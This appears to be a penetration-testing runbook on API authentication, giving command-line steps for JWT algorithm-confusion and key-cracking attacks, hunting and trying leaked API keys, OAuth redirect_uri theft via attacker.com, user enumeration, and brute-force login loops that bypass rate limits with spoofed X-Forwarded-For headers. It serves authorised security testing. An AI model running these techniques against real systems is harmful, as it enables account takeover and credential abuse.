# Runbook: Authentication testing

API authentication is broken more often than application authentication because APIs are built
quickly, updated frequently, and tested less rigorously. The attack surface includes the token
format itself, the issuance and validation logic, and the integration with identity providers.

## Objective

Determine whether the API's authentication can be bypassed, forged, or extracted from public
sources. Identify any endpoints that respond to unauthenticated requests. Find credentials or
tokens exposed in repositories, documentation, or error responses.

## Prerequisites

- Complete endpoint list from the discovery runbook.
- Burp Suite configured as a proxy.
- jwt_tool for JWT analysis and attacks.
- A valid API account and token, where scope permits.
- Hashcat or John for offline cracking if weak signing keys are suspected.

## Phase 1: Unauthenticated access

Test every endpoint without any authentication credentials before testing anything else. APIs
frequently have endpoints that should require authentication but do not enforce it.

Remove the Authorization header and any session cookies from requests to every endpoint in the
collection. Observe which ones return data rather than a 401 or 403.

Pay specific attention to:
- Endpoints with `public`, `open`, or `anon` in the path
- Endpoints that return 200 with an empty result set (may be returning data for an empty identity)
- Endpoints that return 403 rather than 401 (authenticated as anonymous, then denied rather than
  challenged)
- `GET` endpoints for resources that require authentication on `POST`/`PUT`/`DELETE`

Test with a valid but unprivileged token for endpoints that do return 401, to confirm whether
the authentication check and the authorisation check are separate and whether both are enforced.

## Phase 2: JWT analysis

If the API uses JSON Web Tokens, the token itself is a starting point for analysis. JWTs are
base64-encoded and readable without any key material.

### Decode and read the token

```bash
# Decode a JWT (header.payload.signature)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature" | \
  cut -d'.' -f1,2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
```

Note the `alg` field in the header, the claims in the payload (especially `sub`, `role`, `email`,
`exp`, and any custom claims), and the expiry time.

### Algorithm confusion attacks

If the algorithm is `HS256` (HMAC), test whether the API accepts tokens signed with the `none`
algorithm (no signature required):

```bash
jwt_tool TOKEN -X a
```

If the algorithm is `RS256` (RSA), test whether the API accepts a token with the algorithm
changed to `HS256`, signed with the server's public key as the HMAC secret. The public key is
often available from the JWKS endpoint:

```bash
curl https://target.com/.well-known/jwks.json
jwt_tool TOKEN -X k -pk public_key.pem
```

### Weak signing key

If the token uses HMAC, attempt to crack the signing key offline. Many applications use weak
secrets:

```bash
# Extract the token and attempt to crack the key
hashcat -a 0 -m 16500 "header.payload.signature" wordlist.txt
```

A cracked key means you can forge arbitrary tokens with any claims.

### Claim manipulation

With a valid token, modify claims and re-sign (if you have the key) or test whether the API
validates claims properly without signature verification.

```bash
# Modify the role claim and test
jwt_tool TOKEN -T  # interactive mode for claim editing
```

Common claim targets: `role`, `admin`, `is_admin`, `user_id`, `sub`, `scope`.

## Phase 3: API key testing

### Finding exposed keys

API keys appear in JavaScript bundles, GitHub repositories, mobile application binaries, and
sometimes in API responses. Search for key patterns in all passive sources:

```bash
# Common API key patterns in source code
grep -rE "(api_key|apikey|api-key|access_key|secret_key)\s*[=:]\s*['\"][a-zA-Z0-9_-]{16,}" .
grep -rE "Authorization:\s*Bearer\s+[a-zA-Z0-9_-]+" .
```

### Key scope and permission testing

For any API key found, determine its scope before using it. Call the minimal read endpoint first
to confirm the key is valid and understand what identity it represents:

```bash
curl -H "X-API-Key: FOUND_KEY" https://target.com/api/v1/me
curl -H "Authorization: Bearer FOUND_KEY" https://target.com/api/v1/whoami
```

Test whether the key has write permissions by attempting a non-destructive write operation and
observing the response code. A `200` or `201` means write access. A `403` means read-only.

### Key rotation and invalidation

Test whether old keys from historical sources are still valid. API keys are frequently issued
and never rotated. A key committed to a public GitHub repository three years ago may still work.

## Phase 4: OAuth and token endpoint testing

### Token endpoint enumeration

Find the token endpoint and test its behaviour:

```bash
# Test with invalid credentials
curl -s -X POST https://target.com/oauth/token \
  -d "grant_type=password&username=invalid@target.com&password=invalid"
```

Does the error response distinguish between an invalid username and an invalid password? That is
a user enumeration vulnerability.

### Refresh token testing

If the API issues refresh tokens, test:
- Whether a refresh token can be used more than once (single-use invalidation is a security
  control; reuse means the token is not invalidated after use)
- Whether a refresh token issued to one user can retrieve an access token for a different user
  by manipulating the request parameters

### OAuth flow weaknesses

If the application uses OAuth for third-party authentication, test the redirect URI validation:

```bash
# Test redirect_uri manipulation
https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://attacker.com
```

An error that includes the submitted URI in the response can indicate SSRF. An authorisation
code issued to the attacker-controlled redirect is an authorisation code theft vulnerability.

## Phase 5: Rate limit and lockout

Test whether authentication endpoints have rate limiting and whether it can be bypassed.

Send repeated authentication requests and observe when (or if) rate limiting kicks in:

```bash
# Test rate limit existence
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"user@target.com","password":"attempt'$i'"}'
done
```

Common bypass techniques:
- Rotate IP address via proxy or header manipulation
- Add `X-Forwarded-For` or `X-Real-IP` headers with rotating values
- Distribute requests across multiple user accounts
- Slow the request rate to just below the threshold

If the API uses the `X-Forwarded-For` header to identify the client IP without validation, rate
limits based on IP can be bypassed by spoofing the header:

```bash
curl -H "X-Forwarded-For: 1.2.3.$((RANDOM % 255))" \
  -X POST https://target.com/api/auth/login \
  -d '{"username":"user@target.com","password":"test"}'
```

## Output

- List of endpoints that respond to unauthenticated requests.
- JWT analysis: algorithm, claims, signing key strength, vulnerabilities found.
- API keys found in public sources with validity status and permission level.
- OAuth flow findings: user enumeration, redirect URI issues, refresh token weaknesses.
- Rate limit behaviour and any bypass methods that work.

## Playbooks

- [REST API attack chain](../playbooks/rest-api.md)
